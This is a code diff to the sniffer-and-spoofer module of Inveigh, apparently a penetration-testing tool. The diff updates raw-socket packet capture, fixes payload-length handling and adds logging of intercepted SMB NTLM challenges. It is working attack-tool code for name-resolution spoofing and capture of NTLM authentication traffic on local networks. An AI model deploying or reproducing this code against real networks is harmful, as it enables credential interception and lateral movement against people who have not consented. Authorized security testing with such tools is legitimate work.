@@ -12,21 +12,35 @@ namespace Inveigh
         public static FileStream pcapFile = null;
         static Hashtable tcpSessionTable = Hashtable.Synchronized(new Hashtable());
 
-        public static void SnifferSpoofer(string snifferIP, string spooferIP, string dnsTTL, string llmnrTTL, string mdnsTTL, string nbnsTTL, string[] mdnsTypes, string[] nbnsTypes, string[] pcapPortTCP, string[] pcapPortUDP)
+        public static void SnifferSpoofer(string snifferIP, string spooferIP, string dnsTTL, string llmnrTTL, string mdnsTTL, string nbnsTTL, string[] mdnsTypes, string[] nbnsTypes, string[] pcapTCP, string[] pcapUDP)
         {
             byte[] spooferIPData = IPAddress.Parse(spooferIP).GetAddressBytes();
-            Socket snifferSocket;
             byte[] byteIn = new byte[4] { 1, 0, 0, 0 };
             byte[] byteOut = new byte[4] { 1, 0, 0, 0 };
-            byte[] byteData = new byte[4096];
-            snifferSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP);
-            snifferSocket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, true);
-            snifferSocket.ReceiveBufferSize = 4096;
-            IPEndPoint snifferEndPoint;
-            snifferEndPoint = new IPEndPoint(IPAddress.Parse(snifferIP), 0);
-            snifferSocket.Bind(snifferEndPoint);
-            snifferSocket.IOControl(IOControlCode.ReceiveAll, byteIn, byteOut);
-            int packetData;
+            byte[] byteData = new byte[65534];
+            Socket snifferSocket;
+
+            try
+            {
+                snifferSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP);
+                snifferSocket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, true);
+                snifferSocket.ReceiveBufferSize = 65534;
+                IPEndPoint snifferEndPoint = new IPEndPoint(IPAddress.Parse(snifferIP), 0);
+                snifferSocket.Bind(snifferEndPoint);
+                snifferSocket.IOControl(IOControlCode.ReceiveAll, byteIn, byteOut);
+            }
+            catch
+            {
+
+                lock (Program.outputList)
+                {
+                    Program.outputList.Add(String.Format("[-] Error starting packet sniffer, check if shell has elevated privilege or set -Elevated N for unprivileged mode.", DateTime.Now.ToString("s")));
+                }
+
+                throw;
+            }         
+            
+            int packetLength;
             string outputPcap = "";
 
             if (Program.enabledPcap)
@@ -52,20 +66,20 @@ namespace Inveigh
 
                     try
                     {
-                        packetData = snifferSocket.Receive(byteData, 0, byteData.Length, SocketFlags.None);
+                        packetLength = snifferSocket.Receive(byteData, 0, byteData.Length, SocketFlags.None);
                     }
                     catch
                     {
-                        packetData = 0;
+                        packetLength = 0;
                     }
 
-                    if (packetData > 0)
+                    if (packetLength > 0)
                     {
-                        MemoryStream memoryStream = new MemoryStream(byteData, 0, packetData);
+                        MemoryStream memoryStream = new MemoryStream(byteData, 0, packetLength);
                         BinaryReader binaryReader = new BinaryReader(memoryStream);
                         byte versionHL = binaryReader.ReadByte();
                         binaryReader.ReadByte();
-                        uint totalLength = Util.DataToUInt16(binaryReader.ReadBytes(2));
+                        uint totalLength = Util.DataToUInt16(binaryReader.ReadBytes(2)); //this is 0 with tcp offload
                         binaryReader.ReadBytes(5);
                         byte protocolNumber = binaryReader.ReadByte();
                         binaryReader.ReadBytes(2);
@@ -89,7 +103,7 @@ namespace Inveigh
                                 tcpHeaderLength *= 4;
                                 byte tcpFlags = binaryReader.ReadByte();
                                 binaryReader.ReadBytes(7);
-                                int tcpPayloadLength = (int)totalLength - (int)headerLength - (int)tcpHeaderLength;
+                                int tcpPayloadLength = packetLength - (int)headerLength - (int)tcpHeaderLength;
                                 byte[] payloadBytes = binaryReader.ReadBytes(tcpPayloadLength);
                                 string challenge = "";
                                 string session = "";
@@ -155,6 +169,26 @@ namespace Inveigh
 
                                         if (!string.IsNullOrEmpty(challenge) && destinationIP != sourceIP)
                                         {
+
+                                            if(!String.Equals(destinationIP,snifferIP))
+                                            {
+
+                                                lock (Program.outputList)
+                                                {
+                                                    Program.outputList.Add(String.Format("[+] [{0}] SMB({1}) NTLM challenge {2} sent to {3}", DateTime.Now.ToString("s"), tcpSourcePort, challenge, session));
+                                                }
+
+                                            }
+                                            else
+                                            {
+
+                                                lock (Program.outputList)
+                                                {
+                                                    Program.outputList.Add(String.Format("[+] [{0}] SMB({1}) NTLM challenge {2} received from {3}", DateTime.Now.ToString("s"), tcpSourcePort, challenge, session));
+                                                }
+
+                                            }
+
                                             Program.smbSessionTable[session] = challenge;
                                         }
 
@@ -171,6 +205,26 @@ namespace Inveigh
 
                                         if (!string.IsNullOrEmpty(challenge) && destinationIP != sourceIP)
                                         {
+
+                                            if (!String.Equals(destinationIP, snifferIP))
+                                            {
+
+                                                lock (Program.outputList)
+                                                {
+                                                    Program.outputList.Add(String.Format("[+] [{0}] SMB({1}) NTLM challenge {2} sent to {3}", DateTime.Now.ToString("s"), tcpSourcePort, challenge, session));
+                                                }
+
+                                            }
+                                            else
+                                            {
+
+                                                lock (Program.outputList)
+                                                {
+                                                    Program.outputList.Add(String.Format("[+] [{0}] SMB({1}) NTLM challenge {2} received from {3}", DateTime.Now.ToString("s"), tcpSourcePort, challenge, session));
+                                                }
+
+                                            }
+
                                             Program.smbSessionTable[session] = challenge;
                                         }
 
@@ -178,10 +232,10 @@ namespace Inveigh
 
                                 }
 
-                                if (Program.enabledPcap && (pcapPortTCP != null && pcapPortTCP.Length > 0 && (Array.Exists(pcapPortTCP, element => element == tcpSourcePort.ToString()) || 
-                                    Array.Exists(pcapPortTCP, element => element == tcpDestinationPort.ToString()) || Array.Exists(pcapPortTCP, element => element == "ALL"))))
+                                if (Program.enabledPcap && (pcapTCP != null && pcapTCP.Length > 0 && (Array.Exists(pcapTCP, element => element == tcpSourcePort.ToString()) || 
+                                    Array.Exists(pcapTCP, element => element == tcpDestinationPort.ToString()) || Array.Exists(pcapTCP, element => element == "ALL"))))
                                 {
-                                    PcapOutput(totalLength, byteData);
+                                    PcapOutput((uint)packetLength, byteData);
                                 }
 
                                 break;
@@ -520,10 +574,10 @@ namespace Inveigh
 
                                 }
 
-                                if (Program.enabledPcap && (pcapPortUDP != null && pcapPortUDP.Length > 0 && (Array.Exists(pcapPortUDP, element => element == udpSourcePort.ToString()) ||
-                                   Array.Exists(pcapPortUDP, element => element == udpDestinationPort.ToString()) || Array.Exists(pcapPortUDP, element => element == "ALL"))))
+                                if (Program.enabledPcap && (pcapUDP != null && pcapUDP.Length > 0 && (Array.Exists(pcapUDP, element => element == udpSourcePort.ToString()) ||
+                                   Array.Exists(pcapUDP, element => element == udpDestinationPort.ToString()) || Array.Exists(pcapUDP, element => element == "ALL"))))
                                 {
-                                    PcapOutput(totalLength, byteData);
+                                    PcapOutput((uint)packetLength, byteData);
                                 }
 
                                 break;
